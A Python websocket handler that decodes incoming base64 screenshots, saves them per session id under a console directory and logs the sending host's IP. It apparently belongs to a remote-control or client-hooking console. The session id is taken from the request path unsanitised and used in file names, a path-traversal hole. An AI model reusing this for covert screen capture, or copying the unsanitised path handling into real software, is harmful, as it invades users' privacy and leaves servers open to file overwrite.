import time
import os
from modules.abstractModule import Module
from PIL import Image
import base64
import io


import json
import modules.ConsoleServer as server

class ScreenshotModule(Module):
    type = 'screenshot'

    async def handleMessage(self, websocket, msg):
        try:
            # Create directories if they don't exist
            os.makedirs('console/screenshots', exist_ok=True)
            
            image_data = base64.b64decode(msg.split("base64,")[1])
            image = Image.open(io.BytesIO(image_data))
            
            timestamp = str(int(time.time()))
            sid = websocket.request.path.strip("/") if hasattr(websocket, "request") else "unknown"
            
            os.makedirs('console/screenshots', exist_ok=True)
            
            image_path_archive = f"console/screenshots/{sid}_{timestamp}.png"
            image_path_latest = f"console/screenshots/{sid}.png"
            
            image.save(image_path_archive)
            image.save(image_path_latest)
            
            # Notify the console server that we're done
            server.consoleOut = json.dumps({
                "outputType": "info",
                "text": "Screenshot captured",
                "host": getattr(websocket, 'remote_ip', 'unknown'),
                "sid": sid
            })
            
        except Exception as e:
            server.consoleOut = json.dumps({
                "outputType": "error",
                "text": f"Screenshot failed: {str(e)}",
                "host": "system"
            })
        
        await super().sendMessage(websocket)
